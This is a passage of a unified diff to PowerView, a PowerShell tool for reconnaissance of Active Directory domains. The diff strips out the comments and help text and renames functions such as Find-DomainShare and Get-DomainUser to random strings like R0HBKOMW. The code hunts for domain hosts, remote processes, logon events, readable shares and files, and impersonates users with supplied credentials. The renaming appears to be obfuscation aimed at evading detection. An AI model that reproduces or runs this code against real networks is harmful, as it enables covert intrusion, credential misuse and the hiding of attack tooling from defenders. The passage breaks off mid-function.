     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
@@ -17526,20 +10682,20 @@ PowerView.UserProcess
         if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
 
 
-        # first, build the set of computers to enumerate
+        
         if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
-            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[9YE7TFUR] Querying computers in the domain'
+            $TargetComputers = VVVCIHJ3 @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[9YE7TFUR] TargetComputers length: $($TargetComputers.Length)"
         if ($TargetComputers.Length -eq 0) {
-            throw '[Find-DomainProcess] No hosts found to enumerate'
+            throw '[9YE7TFUR] No hosts found to enumerate'
         }
 
-        # now build the user target set
+        
         if ($PSBoundParameters['ProcessName']) {
             $TargetProcessName = @()
             ForEach ($T in $ProcessName) {
@@ -17550,7 +10706,7 @@ PowerView.UserProcess
             }
         }
         elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
-            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+            $TargetUsers = YBTPOIR8 @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         else {
             $GroupSearcherArguments = @{
@@ -17566,18 +10722,18 @@ PowerView.UserProcess
             if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
             if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
             $GroupSearcherArguments
-            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            $TargetUsers = H3GAYKFBMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
 
-        # the host enumeration block we're using to enumerate all servers
+        
         $HostEnumBlock = {
             Param($ComputerName, $ProcessName, $TargetUsers, $Credential)
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    # try to enumerate all active processes on the remote host
-                    # and search for a specific process name
+                    
+                    
                     if ($Credential) {
                         $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                     }
@@ -17585,13 +10741,13 @@ PowerView.UserProcess
                         $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                     }
                     ForEach ($Process in $Processes) {
-                        # if we're hunting for a process name or comma-separated names
+                        
                         if ($ProcessName) {
                             if ($ProcessName -Contains $Process.ProcessName) {
                                 $Process
                             }
                         }
-                        # if the session user is in the target list, display some output
+                        
                         elseif ($TargetUsers -Contains $Process.User) {
                             $Process
                         }
@@ -17602,201 +10758,49 @@ PowerView.UserProcess
     }
 
     PROCESS {
-        # only ignore threading if -Delay is passed
+        
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
-            Write-Verbose "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
+            Write-Verbose "[9YE7TFUR] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[9YE7TFUR] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
             ForEach ($TargetComputer in $TargetComputers) {
                 $Counter = $Counter + 1
 
-                # sleep for our semi-randomized interval
+                
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Write-Verbose "[9YE7TFUR] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                 $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                 $Result
 
                 if ($Result -and $StopOnSuccess) {
-                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
+                    Write-Verbose "[9YE7TFUR] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose "[Find-DomainProcess] Using threading with threads: $Threads"
+            Write-Verbose "[9YE7TFUR] Using threading with threads: $Threads"
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction
+            
             $ScriptParams = @{
                 'ProcessName' = $TargetProcessName
                 'TargetUsers' = $TargetUsers
                 'Credential' = $Credential
             }
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
-            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            
+            24K6KC7J -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
 
 
-function Find-DomainUserEvent {
-<#
-.SYNOPSIS
+function 3FD4HVJP {
 
-Finds logon events on the current (or remote domain) for the specified users.
-
-Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainUser, Get-DomainGroupMember, Get-DomainController, Get-DomainUserEvent, New-ThreadedFunction  
-
-.DESCRIPTION
-
-Enumerates all domain controllers from the specified -Domain
-(default of the local domain) using Get-DomainController, enumerates
-the logon events for each using Get-DomainUserEvent, and filters
-the results based on the targeting criteria.
-
-.PARAMETER ComputerName
-
-Specifies an explicit computer name to retrieve events from.
-
-.PARAMETER Domain
-
-Specifies a domain to query for domain controllers to enumerate.
-Defaults to the current domain.
-
-.PARAMETER Filter
-
-A hashtable of PowerView.LogonEvent properties to filter for.
-The 'op|operator|operation' clause can have '&', '|', 'and', or 'or',
-and is 'or' by default, meaning at least one clause matches instead of all.
-See the exaples for usage.
-
-.PARAMETER StartTime
-
-The [DateTime] object representing the start of when to collect events.
-Default of [DateTime]::Now.AddDays(-1).
-
-.PARAMETER EndTime
-
-The [DateTime] object representing the end of when to collect events.
-Default of [DateTime]::Now.
-
-.PARAMETER MaxEvents
-
-The maximum number of events (per host) to retrieve. Default of 5000.
-
-.PARAMETER UserIdentity
-
-Specifies one or more user identities to search for.
-
-.PARAMETER UserDomain
-
-Specifies the domain to query for users to search for, defaults to the current domain.
-
-.PARAMETER UserLDAPFilter
-
-Specifies an LDAP query string that is used to search for target users.
-
-.PARAMETER UserSearchBase
-
-Specifies the LDAP source to search through for target users.
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER UserGroupIdentity
-
-Specifies a group identity to query for target users, defaults to 'Domain Admins.
-If any other user specifications are set, then UserGroupIdentity is ignored.
-
-.PARAMETER UserAdminCount
-
-Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target computer(s).
-
-.PARAMETER StopOnSuccess
-
-Switch. Stop hunting after finding after finding a target user.
-
-.PARAMETER Delay
-
-Specifies the delay (in seconds) between enumerating hosts, defaults to 0.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.PARAMETER Threads
-
-The number of threads to use for user searching, defaults to 20.
-
-.EXAMPLE
-
-Find-DomainUserEvent
-
-Search for any user events matching domain admins on every DC in the current domain.
-
-.EXAMPLE
-
-$cred = Get-Credential dev\administrator
-Find-DomainUserEvent -ComputerName 'secondary.dev.testlab.local' -UserIdentity 'john'
-
-Search for any user events matching the user 'john' on the 'secondary.dev.testlab.local'
-domain controller using the alternate credential
-
-.EXAMPLE
-
-'primary.testlab.local | Find-DomainUserEvent -Filter @{'IpAddress'='192.168.52.200|192.168.52.201'}
-
-Find user events on the primary.testlab.local system where the event matches
-the IPAddress '192.168.52.200' or '192.168.52.201'.
-
-.EXAMPLE
-
-$cred = Get-Credential testlab\administrator
-Find-DomainUserEvent -Delay 1 -Filter @{'LogonGuid'='b8458aa9-b36e-eaa1-96e0-4551000fdb19'; 'TargetLogonId' = '10238128'; 'op'='&'}
-
-Find user events mathing the specified GUID AND the specified TargetLogonId, searching
-through every domain controller in the current domain, enumerating each DC in serial
-instead of in a threaded manner, using the alternate credential.
-
-.OUTPUTS
-
-PowerView.LogonEvent
-
-PowerView.ExplicitCredentialLogon
-
-.LINK
-
-http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -17920,10 +10924,10 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
         if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }
 
         if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
-            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
+            $TargetUsers = YBTPOIR8 @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
         }
         elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
-            # otherwise we're querying a specific group
+            
             $GroupSearcherArguments = @{
                 'Identity' = $UserGroupIdentity
                 'Recurse' = $True
@@ -17937,34 +10941,34 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
             if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
             if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
             if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
-            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
+            $TargetUsers = H3GAYKFBMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
         }
 
-        # build the set of computers to enumerate
+        
         if ($PSBoundParameters['ComputerName']) {
             $TargetComputers = $ComputerName
         }
         else {
-            # if not -ComputerName is passed, query the current (or target) domain for domain controllers
+            
             $DCSearcherArguments = @{
                 'LDAP' = $True
             }
             if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
             if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
             if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
-            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
-            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose "[3FD4HVJP] Querying for domain controllers in domain: $Domain"
+            $TargetComputers = RP7TH4PM @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
         if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
             $TargetComputers = @(,$TargetComputers)
         }
-        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
-        Write-Verbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
+        Write-Verbose "[3FD4HVJP] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[3FD4HVJP] TargetComputers $TargetComputers"
         if ($TargetComputers.Length -eq 0) {
-            throw '[Find-DomainUserEvent] No hosts found to enumerate'
+            throw '[3FD4HVJP] No hosts found to enumerate'
         }
 
-        # the host enumeration block we're using to enumerate all servers
+        
         $HostEnumBlock = {
             Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)
 
@@ -17980,7 +10984,7 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                     if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
                     if ($Filter -or $TargetUsers) {
                         if ($TargetUsers) {
-                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
+                            YBTPOIR8Event @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                         }
                         else {
                             $Operator = 'or'
@@ -17992,7 +10996,7 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                                 }
                             }
                             $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
-                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
+                            YBTPOIR8Event @DomainUserEventArgs | ForEach-Object {
                                 if ($Operator -eq 'or') {
                                     ForEach ($Key in $Keys) {
                                         if ($_."$Key" -match $Filter[$Key]) {
@@ -18001,7 +11005,7 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                                     }
                                 }
                                 else {
-                                    # and all clauses
+                                    
                                     ForEach ($Key in $Keys) {
                                         if ($_."$Key" -notmatch $Filter[$Key]) {
                                             break
@@ -18013,7 +11017,7 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                         }
                     }
                     else {
-                        Get-DomainUserEvent @DomainUserEventArgs
+                        YBTPOIR8Event @DomainUserEventArgs
                     }
                 }
             }
@@ -18021,34 +11025,34 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
     }
 
     PROCESS {
-        # only ignore threading if -Delay is passed
+        
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
-            Write-Verbose "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
+            Write-Verbose "[3FD4HVJP] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[3FD4HVJP] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
             ForEach ($TargetComputer in $TargetComputers) {
                 $Counter = $Counter + 1
 
-                # sleep for our semi-randomized interval
+                
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Write-Verbose "[3FD4HVJP] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                 $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                 $Result
 
                 if ($Result -and $StopOnSuccess) {
-                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
+                    Write-Verbose "[3FD4HVJP] Target user found, returning early"
                     return
                 }
             }
         }
         else {
-            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $Threads"
+            Write-Verbose "[3FD4HVJP] Using threading with threads: $Threads"
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction
+            
             $ScriptParams = @{
                 'StartTime' = $StartTime
                 'EndTime' = $EndTime
@@ -18058,131 +11062,15 @@ http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
                 'Credential' = $Credential
             }
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
-            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            
+            24K6KC7J -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 }
 
 
-function Find-DomainShare {
-<#
-.SYNOPSIS
+function R0HBKOMW {
 
-Searches for computer shares on the domain. If -CheckShareAccess is passed,
-then only shares the current user has read access to are returned.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, New-ThreadedFunction  
-
-.DESCRIPTION
-
-This function enumerates all machines on the current (or specified) domain
-using Get-DomainComputer, and enumerates the available shares for each
-machine with Get-NetShare. If -CheckShareAccess is passed, then
-[IO.Directory]::GetFiles() is used to check if the current user has read
-access to the given share. If -Credential is passed, then
-Invoke-UserImpersonation is used to impersonate the specified user before
-enumeration, reverting after with Invoke-RevertToSelf.
-
-.PARAMETER ComputerName
-
-Specifies an array of one or more hosts to enumerate, passable on the pipeline.
-If -ComputerName is not passed, the default behavior is to enumerate all machines
-in the domain returned by Get-DomainComputer.
-
-.PARAMETER ComputerDomain
-
-Specifies the domain to query for computers, defaults to the current domain.
-
-.PARAMETER ComputerLDAPFilter
-
-Specifies an LDAP query string that is used to search for computer objects.
-
-.PARAMETER ComputerSearchBase
-
-Specifies the LDAP source to search through for computers,
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER ComputerOperatingSystem
-
-Search computers with a specific operating system, wildcards accepted.
-
-.PARAMETER ComputerServicePack
-
-Search computers with a specific service pack, wildcards accepted.
-
-.PARAMETER ComputerSiteName
-
-Search computers in the specific AD Site name, wildcards accepted.
-
-.PARAMETER CheckShareAccess
-
-Switch. Only display found shares that the local user has access to.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain and target systems.
-
-.PARAMETER Delay
-
-Specifies the delay (in seconds) between enumerating hosts, defaults to 0.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.PARAMETER Threads
-
-The number of threads to use for user searching, defaults to 20.
-
-.EXAMPLE
-
-Find-DomainShare
-
-Find all domain shares in the current domain.
-
-.EXAMPLE
-
-Find-DomainShare -CheckShareAccess
-
-Find all domain shares in the current domain that the current user has
-read access to.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Find-DomainShare -Domain testlab.local -Credential $Cred
-
-Searches for domain shares in the testlab.local domain using the specified alternate credentials.
-
-.OUTPUTS
-
-PowerView.ShareInfo
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.ShareInfo')]
@@ -18284,37 +11172,37 @@ PowerView.ShareInfo
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
-            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[R0HBKOMW] Querying computers in the domain'
+            $TargetComputers = VVVCIHJ3 @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[R0HBKOMW] TargetComputers length: $($TargetComputers.Length)"
         if ($TargetComputers.Length -eq 0) {
-            throw '[Find-DomainShare] No hosts found to enumerate'
+            throw '[R0HBKOMW] No hosts found to enumerate'
         }
 
-        # the host enumeration block we're using to enumerate all servers
+        
         $HostEnumBlock = {
             Param($ComputerName, $CheckShareAccess, $TokenHandle)
 
             if ($TokenHandle) {
-                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
-                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
+                
+                $Null = ECK2AE5S -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
                 $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                 if ($Up) {
-                    # get the shares for this host and check what we find
-                    $Shares = Get-NetShare -ComputerName $TargetComputer
+                    
+                    $Shares = BFEUNBGI -ComputerName $TargetComputer
                     ForEach ($Share in $Shares) {
                         $ShareName = $Share.Name
-                        # $Remark = $Share.Remark
+                        
                         $Path = '\\'+$TargetComputer+'\'+$ShareName
 
                         if (($ShareName) -and ($ShareName.trim() -ne '')) {
-                            # see if we want to check access to this share
+                            
                             if ($CheckShareAccess) {
-                                # check if the user has access to this path
+                                
                                 try {
                                     $Null = [IO.Directory]::GetFiles($Path)
                                     $Share
@@ -18332,207 +11220,64 @@ PowerView.ShareInfo
             }
 
             if ($TokenHandle) {
-                Invoke-RevertToSelf
+                JCUMHZOK
             }
         }
 
         $LogonToken = $Null
         if ($PSBoundParameters['Credential']) {
             if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential
+                $LogonToken = ECK2AE5S -Credential $Credential
             }
             else {
-                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
+                $LogonToken = ECK2AE5S -Credential $Credential -Quiet
             }
         }
     }
 
     PROCESS {
-        # only ignore threading if -Delay is passed
+        
         if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
 
-            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
-            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
+            Write-Verbose "[R0HBKOMW] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[R0HBKOMW] Delay: $Delay, Jitter: $Jitter"
             $Counter = 0
             $RandNo = New-Object System.Random
 
             ForEach ($TargetComputer in $TargetComputers) {
                 $Counter = $Counter + 1
 
-                # sleep for our semi-randomized interval
+                
                 Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
 
-                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Write-Verbose "[R0HBKOMW] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                 Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
             }
         }
         else {
-            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"
+            Write-Verbose "[R0HBKOMW] Using threading with threads: $Threads"
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction
+            
             $ScriptParams = @{
                 'CheckShareAccess' = $CheckShareAccess
                 'TokenHandle' = $LogonToken
             }
 
-            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
-            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+            
+            24K6KC7J -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
         }
     }
 
     END {
         if ($LogonToken) {
-            Invoke-RevertToSelf -TokenHandle $LogonToken
+            JCUMHZOK -TokenHandle $LogonToken
         }
     }
 }
 
 
-function Find-InterestingDomainShareFile {
-<#
-.SYNOPSIS
+function Q2OLEVLP {
 
-Searches for files matching specific criteria on readable shares
-in the domain.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, Find-InterestingFile, New-ThreadedFunction  
-
-.DESCRIPTION
-
-This function enumerates all machines on the current (or specified) domain
-using Get-DomainComputer, and enumerates the available shares for each
-machine with Get-NetShare. It will then use Find-InterestingFile on each
-readhable share, searching for files marching specific criteria. If -Credential
-is passed, then Invoke-UserImpersonation is used to impersonate the specified
-user before enumeration, reverting after with Invoke-RevertToSelf.
-
-.PARAMETER ComputerName
-
-Specifies an array of one or more hosts to enumerate, passable on the pipeline.
-If -ComputerName is not passed, the default behavior is to enumerate all machines
-in the domain returned by Get-DomainComputer.
-
-.PARAMETER ComputerDomain
-
-Specifies the domain to query for computers, defaults to the current domain.
-
-.PARAMETER ComputerLDAPFilter
-
-Specifies an LDAP query string that is used to search for computer objects.
-
-.PARAMETER ComputerSearchBase
-
-Specifies the LDAP source to search through for computers,
-e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.
-
-.PARAMETER ComputerOperatingSystem
-
-Search computers with a specific operating system, wildcards accepted.
-
-.PARAMETER ComputerServicePack
-
-Search computers with a specific service pack, wildcards accepted.
-
-.PARAMETER ComputerSiteName
-
-Search computers in the specific AD Site name, wildcards accepted.
-
-.PARAMETER Include
-
-Only return files/folders that match the specified array of strings,
-i.e. @(*.doc*, *.xls*, *.ppt*)
-
-.PARAMETER SharePath
-
-Specifies one or more specific share paths to search, in the form \\COMPUTER\Share
-
-.PARAMETER ExcludedShares
-
-Specifies share paths to exclude, default of C$, Admin$, Print$, IPC$.
-
-.PARAMETER LastAccessTime
-
-Only return files with a LastAccessTime greater than this date value.
-
-.PARAMETER LastWriteTime
-
-Only return files with a LastWriteTime greater than this date value.
-
-.PARAMETER CreationTime
-
-Only return files with a CreationTime greater than this date value.
-
-.PARAMETER OfficeDocs
-
-Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)
-
-.PARAMETER FreshEXEs
-
-Switch. Find .EXEs accessed within the last 7 days.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain and target systems.
-
-.PARAMETER Delay
-
-Specifies the delay (in seconds) between enumerating hosts, defaults to 0.
-
-.PARAMETER Jitter
-
-Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3
-
-.PARAMETER Threads
-
-The number of threads to use for user searching, defaults to 20.
-
-.EXAMPLE
-
-Find-InterestingDomainShareFile
-
-Finds 'interesting' files on the current domain.
-
-.EXAMPLE
-
-Find-InterestingDomainShareFile -ComputerName @('windows1.testlab.local','windows2.testlab.local')
-
-Finds 'interesting' files on readable shares on the specified systems.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('DEV\dfm.a', $SecPassword)
-Find-DomainShare -Domain testlab.local -Credential $Cred
-
-Searches interesting files in the testlab.local domain using the specified alternate credentials.
-
-.OUTPUTS
-
-PowerView.FoundFile
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.FoundFile')]
@@ -18666,43 +11411,43 @@ PowerView.FoundFile
             $TargetComputers = $ComputerName
         }
         else {
-            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
-            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+            Write-Verbose '[Q2OLEVLP] Querying computers in the domain'
+            $TargetComputers = VVVCIHJ3 @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
         }
-        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
+        Write-Verbose "[Q2OLEVLP] TargetComputers length: $($TargetComputers.Length)"
         if ($TargetComputers.Length -eq 0) {
-            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
+            throw '[Q2OLEVLP] No hosts found to enumerate'
         }
 
-        # the host enumeration block we're using to enumerate all servers
+        
         $HostEnumBlock = {
             Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)
 
             if ($TokenHandle) {
-                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
-                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
+                
+                $Null = ECK2AE5S -TokenHandle $TokenHandle -Quiet
             }
 
             ForEach ($TargetComputer in $ComputerName) {
 
                 $SearchShares = @()
                 if ($TargetComputer.StartsWith('\\')) {
-                    # if a share is passed as the server
+                    
                     $SearchShares += $TargetComputer
                 }
                 else {
                     $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                     if ($Up) {
-                        # get the shares for this host and display what we find
-                        $Shares = Get-NetShare -ComputerName $TargetComputer
+                        
+                        $Shares = BFEUNBGI -ComputerName $TargetComputer
                         ForEach ($Share in $Shares) {
                             $ShareName = $Share.Name
                             $Path = '\\'+$TargetComputer+'\'+$ShareName
-                            # make sure we get a real share name back
+                            
